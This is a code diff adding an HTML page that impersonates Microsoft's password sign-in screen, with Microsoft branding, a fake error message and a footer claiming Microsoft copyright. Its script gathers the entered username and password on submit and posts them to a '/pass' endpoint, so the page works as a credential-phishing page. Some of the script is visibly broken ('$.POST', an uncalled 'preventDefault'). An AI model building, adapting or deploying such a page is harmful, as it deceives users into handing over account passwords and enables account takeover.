@@ -1,0 +1,76 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Sign in to your Microsoft account</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="favicon.ico">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/pass.css">
+    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <style type="text/css">
+        
+    </style>
+</head>
+<body>
+  
+<div class="container-fluid">
+    <div class="row d-flex align-items-center">
+        <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
+            <div class="card">
+                <div class="card-body">
+                    <img src="assets/images/logo.svg">
+                    <p><a href="?cngmail=true" ><img src="assets/images/arrow_left.svg"></a></p>
+                    <h4>Enter password</h4>
+                    <span id="error" class="d-none">Your account or password is incorrect. If you don't remember your password, <a href="#">reset it now.</a></span>
+                    <form  autocomplete="off" >
+                        <div class="form-group">
+						<input id="name" type="hidden" name="name" >
+                            <input id="pass"  type="password" class="form-control" id="pass" name="password" placeholder="Password" required>
+                        </div>
+                        <div class="form-group form-check">
+                            <label class="form-check-label">
+                                <input class="form-check-input" type="checkbox"> Keep me signed in
+                            </label>
+                        </div>
+                        <p><a href="#">Forgot my password</a></p>
+                        <button type="submit" class="btn float-right">Sign In</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    <p><img src="assets/images/ellipsis_white.svg"></p>
+    <p>Privacy & cookies</p>
+    <p>Terms of use</p>
+    <p>©2020 Microsoft</p>
+</div>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script>
+        document.querySelector('form').addEventListener('submit' , (e) =>{
+            e.preventDefault
+            const name = document.getElementById('name').value
+            const pass = document.getElementById('pass').value
+
+            const data = {
+                name,
+                pass
+            }
+            $.POST('/pass', data, () => {
+                console.log("info recieved")
+            })
+
+        })
+    </script>
+
+</body>
+</html>
